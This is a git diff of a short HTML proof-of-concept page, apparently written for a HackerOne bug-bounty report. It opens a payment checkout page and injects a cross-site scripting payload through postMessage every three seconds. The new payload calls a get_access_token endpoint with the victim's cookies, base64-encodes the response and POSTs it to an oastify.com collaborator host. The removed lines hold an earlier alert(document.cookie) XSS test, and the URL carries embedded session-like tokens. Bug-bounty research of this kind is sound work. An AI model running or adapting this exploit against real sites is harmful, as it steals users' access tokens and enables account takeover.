@@ -1,9 +1,25 @@
 <html>
 <body>
 <script>
-hwin = window.open("https://bugbounty-secure.dctest.donorschoose.org");
+hwin = window.open("https://cashier-my4a.pipopay.com/obj/pipo-checkout-sg/pipo/fe/payin_checkout/pipoux_checkout/1001657/instant-cashier.html?idc=my4a&theme=soundon&merchant_id=11202311FuctR2&abParams=%7B%22pda_config%22%3A%7B%22enable%22%3A1%7D%7D&improveAuth=1&fp_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGFuZGFyZF9jbGFpbXMiOnsianRpIjoiQWtBQUFEMEZYdjBVVEVJWnNoNHFZWkhxNG80ViJ9LCJraW5mIjp7Imt0cCI6IktNU1YyX1NJR05fS0VZIn0sInQiOjF9.MPWMR8h2WlSgGDw38araIInWVH8GFIU7l4HVs7NT6AI&fp_scene_tn=AkEAAKILPyncGUi7lhO99lWEAQHEV&app_id=5049&pre_order_id=202607010312200021000B0ULswpWSNk&locale=en-SG");
 setInterval(function(){
- hwin.postMessage('{"action":"showScreenAndOverlay","message":"<script>alert(document.cookie)</script>"}',"*")
+ hwin.postMessage({
+	from: "parent",
+	event: "update-data",
+	data: {
+		showJumpExternalPrompt: true,
+		redirectData: {
+			redirect_details: {
+				url: "https://hackerone.com/tiktok#johnstone_POC",
+				method: "POST",
+				header: { three_ds_del_mid_page: "nonstandalone" },
+				body: {
+					x: `"><img src=x onerror="(async()=>{try{const r=await fetch('https://cashier-my4a.pipopay.com/user/v1/get_access_token?fp_token=',{method:'POST',credentials:'include',mode:'cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({probe:1})});const j=await r.json();const b=btoa(unescape(encodeURIComponent(JSON.stringify(j))));await fetch('https://gg04hemx4p20njhbibm925byxp3gr6fv.oastify.com/other',{method:'POST',mode:'no-cors',body:b});}catch(e){}})()">`,
+				},
+			},
+		},
+	},
+}, "*")
 },3000)
 </script>
 </body>
